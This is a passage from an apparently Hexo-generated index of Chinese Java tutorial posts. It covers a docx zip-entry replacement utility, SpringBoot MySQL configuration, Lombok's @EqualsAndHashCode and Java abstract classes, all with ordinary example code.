class_">File</span>(outFilePath).delete();</span><br><span class="line">        logger.info(<span class="string">&quot;Word-docx文档生成完成&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ZipInputStream <span class="title function_">wrapZipInputStream</span><span class="params">(InputStream inputStream)</span>&#123;</span><br><span class="line">        <span class="type">ZipInputStream</span> <span class="variable">zipInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ZipInputStream</span>(inputStream);</span><br><span class="line">        <span class="keyword">return</span> zipInputStream;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ZipOutputStream <span class="title function_">wrapZipOutputStream</span><span class="params">(OutputStream outputStream)</span>&#123;</span><br><span class="line">        <span class="type">ZipOutputStream</span> <span class="variable">zipOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ZipOutputStream</span>(outputStream);</span><br><span class="line">        <span class="keyword">return</span> zipOutputStream;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">replaceItemList</span><span class="params">(ZipInputStream zipInputStream, ZipOutputStream zipOutputStream, List&lt;String&gt; itemNameList, List&lt;InputStream&gt; itemInputStreamList)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">null</span> == zipInputStream)&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">null</span> == zipOutputStream)&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">        ZipEntry entryIn;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">while</span>((entryIn = zipInputStream.getNextEntry())!=<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">entryName</span> <span class="operator">=</span>  entryIn.getName();</span><br><span class="line">                <span class="type">ZipEntry</span> <span class="variable">entryOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ZipEntry</span>(entryName);</span><br><span class="line">                zipOutputStream.putNextEntry(entryOut);</span><br><span class="line">                <span class="type">byte</span> [] buf = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8</span>*<span class="number">1024</span>];</span><br><span class="line">                <span class="type">int</span> len;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(itemNameList.indexOf(entryName) != -<span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="comment">// 使用替换流</span></span><br><span class="line">                    <span class="keyword">while</span>((len = (itemInputStreamList.get(itemNameList.indexOf(entryName)).read(buf))) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        zipOutputStream.write(buf, <span class="number">0</span>, len);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 输出普通Zip流</span></span><br><span class="line">                    <span class="keyword">while</span>((len = (zipInputStream.read(buf))) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        zipOutputStream.write(buf, <span class="number">0</span>, len);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 关闭此 entry</span></span><br><span class="line">                zipOutputStream.closeEntry();</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">//e.printStackTrace();</span></span><br><span class="line">            <span class="keyword">for</span> (InputStream itemInputStream:itemInputStreamList) &#123;</span><br><span class="line">                close(itemInputStream);</span><br><span class="line">            &#125;</span><br><span class="line">            close(zipInputStream);</span><br><span class="line">            close(zipOutputStream);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">(InputStream inputStream)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">null</span> != inputStream)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                inputStream.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">(OutputStream outputStream)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">null</span> != outputStream)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                outputStream.flush();</span><br><span class="line">                outputStream.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="三：测试类"><a href="#三：测试类" class="headerlink" title="三：测试类"></a>三：测试类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CX330</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Map&lt;String, Object&gt; data = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        data.put(<span class="string">&quot;one&quot;</span>, <span class="string">&quot;RupertTears&quot;</span>);</span><br><span class="line">        data.put(<span class="string">&quot;two&quot;</span>, <span class="string">&quot;Thought is already is late, exactly is the earliest time.&quot;</span>);</span><br><span class="line">        data.put(<span class="string">&quot;three&quot;</span>, <span class="string">&quot;成功&quot;</span>);</span><br><span class="line">        data.put(<span class="string">&quot;six&quot;</span>, <span class="string">&quot;成功6&quot;</span>);</span><br><span class="line">        data.put(<span class="string">&quot;five&quot;</span>, <span class="string">&quot;成功5&quot;</span>);</span><br><span class="line">        GenerateDocxUtil.freemarkerDocxTest(<span class="string">&quot;C:\\Users\\lenovo\\Desktop\\res\\res\\res\\res\\&quot;</span>, data, <span class="string">&quot;C:\\Users\\lenovo\\Desktop\\巡检报告xx622.docx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java开发手册 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringBoot配置连接MySQL数据库</title>
      <link href="/blog/2b798803.html/"/>
      <url>/blog/2b798803.html/</url>
      
        <content type="html"><![CDATA[<h1 id="SpringBoot-配置连接-MySQL-数据库"><a href="#SpringBoot-配置连接-MySQL-数据库" class="headerlink" title="SpringBoot 配置连接 MySQL 数据库"></a>SpringBoot 配置连接 MySQL 数据库</h1><h2 id="一：引入依赖"><a href="#一：引入依赖" class="headerlink" title="一：引入依赖"></a>一：引入依赖</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="二：编辑-yaml-文件"><a href="#二：编辑-yaml-文件" class="headerlink" title="二：编辑 yaml 文件"></a>二：编辑 yaml 文件</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">Developer</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/aaa?serverTimezone=UTC&amp;useUnicode=true&amp;characterEcoding=utf-8</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8088</span></span><br></pre></td></tr></table></figure><h2 id="三：配置包扫描"><a href="#三：配置包扫描" class="headerlink" title="三：配置包扫描"></a>三：配置包扫描</h2><p>SpringBoot 拥有默认的包扫描机制，启动类所在当前包及其包的子类都会默认被扫描；</p><p>有时会因为 Bean 和启动类不在一个文件夹下，导致扫描不到引起的注解失败问题。</p><p>如何修改包扫描的位置？</p><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>在启动类 SpringBootApplication 注解中配置 scanBasePackages即可，如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication(scanBasePackages = &#123;&quot;cn.aiyingke.developer.mysql&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeveloperApplication</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(DeveloperApplication.class, args);</span><br><span class="line">        System.out.println(<span class="string">&quot;Program startup completed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也可以配置多个包路径；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication(scanBasePackages = &#123;&quot;cn.aiyingke.developer.mysql&quot;,&quot;cn.aiyingke.developer.mysql.ebean&quot;&#125;)</span></span><br></pre></td></tr></table></figure><h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>在启动类里面添加 @ComponentScan 注解配置 basePackages；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@ComponentScan(&quot;cn.aiyingke.developer.mysql&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeveloperApplication</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(DeveloperApplication.class, args);</span><br><span class="line">        System.out.println(<span class="string">&quot;Program startup completed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="四：测试类"><a href="#四：测试类" class="headerlink" title="四：测试类"></a>四：测试类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 22:11 2022/11/21</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/mysql&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcController</span> &#123;</span><br><span class="line">    <span class="keyword">final</span></span><br><span class="line">    JdbcTemplate jdbcTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">JdbcController</span><span class="params">(JdbcTemplate jdbcTemplate)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.jdbcTemplate = jdbcTemplate;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/mdtList&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Map&lt;String, Object&gt;&gt; <span class="title function_">mdtList</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from mdt&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> jdbcTemplate.queryForList(sql);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java编程 </category>
          
          <category> SpringBoot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java开发手册 </tag>
            
            <tag> SpringBoot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lombok之@EqualsAndHashCode</title>
      <link href="/blog/5171df44.html/"/>
      <url>/blog/5171df44.html/</url>
      
        <content type="html"><![CDATA[<h1 id="Lombok-之-EqualsAndHashCode-使用"><a href="#Lombok-之-EqualsAndHashCode-使用" class="headerlink" title="Lombok 之 @EqualsAndHashCode 使用"></a>Lombok 之 @EqualsAndHashCode 使用</h1><h2 id="一：作用"><a href="#一：作用" class="headerlink" title="一：作用"></a>一：作用</h2><p>该注解的作用就是自动给 model bean 实现 equals 方法和 hashcode 方法。</p><h2 id="二：参数"><a href="#二：参数" class="headerlink" title="二：参数"></a>二：参数</h2><ul><li>@EqualsAndHashCode(callSuper &#x3D; false ) 默认参数，父类属性不参与比较。</li><li>@EqualsAndHashCode(callSuper &#x3D; true) 调用父类属性，进行比较。</li></ul><h2 id="三：代码示例"><a href="#三：代码示例" class="headerlink" title="三：代码示例"></a>三：代码示例</h2><h3 id="（1）实体类"><a href="#（1）实体类" class="headerlink" title="（1）实体类"></a>（1）实体类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TV</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@EqualsAndHashCode(callSuper = true)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XiaoMiTV</span> <span class="keyword">extends</span> <span class="title class_">TV</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">float</span> price;</span><br><span class="line">    <span class="keyword">private</span> String color;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">XiaoMiTV</span><span class="params">(<span class="type">int</span> id, String name, <span class="type">float</span> price, String color)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(id, name);</span><br><span class="line">        <span class="built_in">this</span>.price = price;</span><br><span class="line">        <span class="built_in">this</span>.color = color;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（2）测试类"><a href="#（2）测试类" class="headerlink" title="（2）测试类"></a>（2）测试类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EqualsTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 默认情况  不调用父类属性比较  结果为：true</span></span><br><span class="line">        <span class="type">XiaoMiTV</span> <span class="variable">xiaoMiTV</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XiaoMiTV</span>(<span class="number">1</span>,<span class="string">&quot;小米&quot;</span>,<span class="number">99.99f</span>,<span class="string">&quot;red&quot;</span>);</span><br><span class="line">        <span class="type">XiaoMiTV</span> <span class="variable">xiaoMiTV2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XiaoMiTV</span>(<span class="number">2</span>,<span class="string">&quot;小米2&quot;</span>,<span class="number">99.99f</span>,<span class="string">&quot;red&quot;</span>);</span><br><span class="line">        System.out.println(xiaoMiTV.equals(xiaoMiTV2)); <span class="comment">// false</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java开发手册 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java抽象类</title>
      <link href="/blog/f631dc76.html/"/>
      <url>/blog/f631dc76.html/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-抽象类"><a href="#Java-抽象类" class="headerlink" title="Java 抽象类"></a>Java 抽象类</h1><h2 id="一：什么是抽象类？"><a href="#一：什么是抽象类？" class="headerlink" title="一：什么是抽象类？"></a>一：什么是抽象类？</h2><p style="text-indent:2em;">在面向对象的概念中在，所有的对象都是通过类来描绘的，但反过来讲，并不是所有的类都是用来描绘对象的。如果一个类中没有包含足够的信息来描绘一个具体的对象，这个类就是抽象类。父类包含了之类集合的常用方法，但是由于父类本身是抽象的，所以不能使用这些方法。</p><p style="text-indent:2em;">抽象类是指不允许被实例化的类；抽象方法是没有方法体的方法。</p><ol><li>抽象类可以不包括抽象方法，反正它不会被实例化，里面的方法是不是抽象的本质上没有任何影响。</li><li>但是含有抽象方法的类绝不能被实例化，否则执行这个方法的时候，应该怎么办！</li><li>如果子类是非抽象的，那么它就必须实现父类中的抽象方法；否则，它继承来的抽象方法仍然没有方法体，也是个抽象方法，因此之类必须实现父类的抽象方法。</li></ol><h2 id="二：抽象类可以被继承吗？"><a href="#二：抽象类可以被继承吗？" class="headerlink" title="二：抽象类可以被继承吗？"></a>二：抽象类可以被继承吗？</h2><ol><li>抽象类可以被继承。</li><li>抽象类除了不能被实例化对象之外，类的其他功能依然存在，成员变量、成员方法及构造方法的访问方式和普通的类一样。</li><li>由于抽象类不能被实例化对象，所以抽象类必须被继承才能使用。也正因如此，在设计阶段决定要不要设计抽象类。</li></ol><h2 id="三：知识汇总"><a href="#三：知识汇总" class="headerlink" title="三：知识汇总"></a>三：知识汇总</h2><ol><li>abstract 是一个修饰符；</li><li>使用 abstract 修饰的类是抽象类；</li><li>使用 abstract 修饰的方法是抽象方法，抽象方法没有方法体；只能进行功能定义，没有功能实现，功能实现由之类完成；</li><li>实现抽象方法，就是给抽象方法加上方法体，去掉 abstract 修饰；</li><li>抽象类的目的：该类不能被实例化对象，只能被继承；</li><li>抽象方法一定在抽象类中成立；</li><li>抽象类中不一定由抽象方法，比如不想让某个类有对象，可以创建为抽象类；</li><li>final 修饰的类不能被继承；</li><li>final 修饰的成员方法不能被覆写；</li><li>抽象类就是用于被继承的；</li><li>抽象方法就是用于被覆写的；</li><li>因而 final 和 abstract 不能同时出现；</li><li>一个类若想继承一个抽象类，必须实现该抽象类的所有抽象方法；</li><li>一个抽象类如果想要继承一个抽象类，可以实现0~N个抽象方法；</li><li>虽然抽象类不能被创建对象，但是抽象类有构造方法，因为之类创建对象需要调用父类然后调用 Object 实现；</li><li>abstract 是不能修饰静态方法的，因为静态方法不能被覆写；</li><li>抽象方法与成员方法一样，仅仅是没有方法体而已；</li><li>抽象方法必须被覆写，成员方法根据需求覆写；</li></ol><h2 id="四：抽象类应用场景"><a href="#四：抽象类应用场景" class="headerlink" title="四：抽象类应用场景"></a>四：抽象类应用场景</h2><ul><li><p>例如我们在定义父类的时候，仅仅知道父类的功能，不知道如何实现时；</p></li><li><p>举例：动物会运动；但是运动的方式不一样，有天上飞的、地下跑的、水里游的…</p></li><li><p>这是，我们就能定义为抽象类说明功能，具体的实现由实现类去完成；</p></li></ul><h2 id="五：代码示例"><a href="#五：代码示例" class="headerlink" title="五：代码示例"></a>五：代码示例</h2><h3 id="（1）父类"><a href="#（1）父类" class="headerlink" title="（1）父类"></a>（1）父类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">call</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（2）子类"><a href="#（2）子类" class="headerlink" title="（2）子类"></a>（2）子类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Cat</span> <span class="keyword">extends</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;猫在地上跑~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">call</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;喵喵叫~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Fish</span> <span class="keyword">extends</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;鱼在水中游...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GoldFish</span> <span class="keyword">extends</span> <span class="title class_">Fish</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">call</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;金鱼咕咕叫~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（3）测试"><a href="#（3）测试" class="headerlink" title="（3）测试"></a>（3）测试</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">GoldFish</span> <span class="variable">goldFish</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GoldFish</span>();</span><br><span class="line">        goldFish.call();</span><br><span class="line">        goldFish.run();</span><br><span class="line">        <span class="type">Cat</span> <span class="variable">cat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cat</span>();</span><br><span class="line">        cat.call();</span><br><span class="line">        cat.run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">金鱼咕咕叫~</span><br><span class="line">鱼在水中游...</span><br><span class="line">喵喵叫~</span><br><span class="line">猫在地上跑~</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java理论基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>专业词汇积累009</title>
      <link href="/blog/5ce6ff36.html/"/>
      <url>/blog/5ce6ff36.html/</url>
      
